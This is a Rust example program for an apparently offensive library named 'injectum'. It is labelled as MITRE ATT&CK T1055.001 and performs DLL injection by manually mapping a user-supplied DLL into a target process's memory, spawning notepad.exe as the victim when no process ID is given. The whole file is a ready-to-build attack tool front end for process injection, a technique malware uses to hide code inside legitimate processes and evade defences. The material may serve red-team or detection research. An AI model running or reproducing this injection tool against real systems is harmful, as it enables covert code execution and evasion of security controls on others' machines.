//! Example: T1055.001 - Memory Module (Manual Mapping)
//!
//! Build:
//! ```sh
//! cargo build --package injectum --example T1055_001_MemoryModule --features "tracing,T1055_001" --release
//! ```
//!
//! Usage:
//! ```sh
//! ./T1055_001_MemoryModule.exe <DLL_PATH> [PID]
//! ```
//!
//! * DLL_PATH : Path to the DLL to map.
//! * PID      : (Optional) Process ID. If missing, a new 'notepad.exe' process is spawned.

#[cfg(not(feature = "tracing"))]
mod logs {
    #[macro_export]
    macro_rules! error { ($($arg:tt)*) => { let _ = format_args!($($arg)*); }; }
    #[macro_export]
    macro_rules! info { ($($arg:tt)*) => { let _ = format_args!($($arg)*); }; }
    #[macro_export]
    macro_rules! warn { ($($arg:tt)*) => { let _ = format_args!($($arg)*); }; }
}

use injectum::{
    Error, InjectorBuilder, Payload, PayloadMetadata, Result, Target, Technique,
    method::DynamicLinkLibrary,
};
use std::{env::args, path::PathBuf, process::Command};
#[cfg(feature = "tracing")]
use tracing::{error, info, warn};

fn main() {
    if let Err(e) = run() {
        error!("Error: {}", e);
    }
}

fn run() -> Result<()> {
    setup_logging();
    let (process_id, dll_path) = parse_args()?;

    info!("------------------------------------------------");
    info!("Target Process ID : {}", process_id);
    info!("Technique         : T1055.001 (Memory Module)");
    info!("Payload           : {:?}", dll_path);
    info!("------------------------------------------------");

    inject_memory_module(process_id, dll_path)?;

    info!("Success: Injection completed.");
    Ok(())
}

/// Performs Memory Module Injection.
fn inject_memory_module(process_id: u32, dll_path: PathBuf) -> Result<()> {
    let payload = Payload::from_file(dll_path, PayloadMetadata::default())?;
    let technique = Technique::T1055_001(DynamicLinkLibrary::MemoryModule);

    InjectorBuilder::new()
        .target(Target::Pid(process_id))
        .technique(technique)
        .payload(payload)
        .execute()
}

/// Parses CLI arguments.
fn parse_args() -> Result<(u32, PathBuf)> {
    let cli_args: Vec<String> = args().collect();

    if cli_args.len() < 2 {
        println!("Usage: ./T1055_001_MemoryModule.exe <DLL_PATH> [PID]");
        return Err(Error::Validation("Missing DLL path.".into()));
    }

    // 1. Parse DLL Path
    let dll_path = PathBuf::from(&cli_args[1])
        .canonicalize()
        .map_err(|e| Error::Validation(format!("Invalid DLL path '{}': {}", &cli_args[1], e)))?;

    if !dll_path.exists() {
        return Err(Error::Validation("DLL file does not exist.".into()));
    }

    // 2. Parse PID (Optional)
    let process_id = if cli_args.len() > 2 {
        cli_args[2]
            .parse::<u32>()
            .map_err(|_| Error::Validation("Invalid PID. Must be a positive integer.".into()))?
    } else {
        warn!("No PID provided. Spawning 'notepad.exe' as target...");
        let child = Command::new("notepad.exe")
            .spawn()
            .map_err(|e| Error::Validation(format!("Failed to spawn target: {}", e)))?;
        child.id()
    };

    Ok((process_id, dll_path))
}

fn setup_logging() {
    #[cfg(feature = "tracing")]
    {
        use tracing_subscriber::EnvFilter;
        let _ = tracing_subscriber::fmt()
            .with_target(true)
            .with_env_filter(
                EnvFilter::try_from_default_env().unwrap_or_else(|_| EnvFilter::new("info")),
            )
            .without_time()
            .try_init();
    }
}
